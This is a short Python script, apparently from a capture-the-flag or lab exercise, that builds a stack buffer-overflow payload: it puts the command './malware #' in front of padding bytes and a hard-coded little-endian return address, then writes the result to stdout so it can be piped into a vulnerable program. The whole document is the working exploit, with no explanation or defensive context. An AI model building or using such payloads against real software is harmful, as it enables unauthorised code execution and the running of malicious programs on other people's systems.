import sys

command = b"./malware #"
padding = b"A" * (24 - len(command))
address = (0x401a6b).to_bytes(8, "little")

payload = command + padding + address

sys.stdout.buffer.write(payload + b"\n")
